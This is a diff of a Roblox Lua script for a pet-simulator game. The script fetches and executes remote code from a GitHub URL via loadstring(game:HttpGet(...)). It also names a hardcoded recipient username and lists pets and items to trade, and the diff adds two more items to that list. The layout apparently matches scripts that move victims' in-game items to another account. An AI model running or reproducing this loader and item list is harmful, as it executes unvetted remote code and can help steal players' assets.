@@ -4,7 +4,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/fdvll/pet-simulator-9
 if game.PlaceId == 8737899170 then
     Username = "REyifpof"
     getgenv().PetToTrade = {
-        {Pet = "Pineapple Monkey", Patern = 2}
+        --{Pet = "Pineapple Monkey", Patern = 2}
 
 
     }
@@ -28,12 +28,14 @@ if game.PlaceId == 8737899170 then
         "Daycare Slot Voucher",
         "Spinny Wheel Ticket",
         "Tech Spinny Wheel Ticket",
+        "Void Spinny Wheel Ticket",
         "Diamond",
         "Insta Plant Capsule",
         "Seed Bag",
         "Arcade Token",
         "Hype Egg",
-        "Global Event Gift"
+        "Global Event Gift",
+        "Seashell"
 }
 
     local library = require(game.ReplicatedStorage.Library)
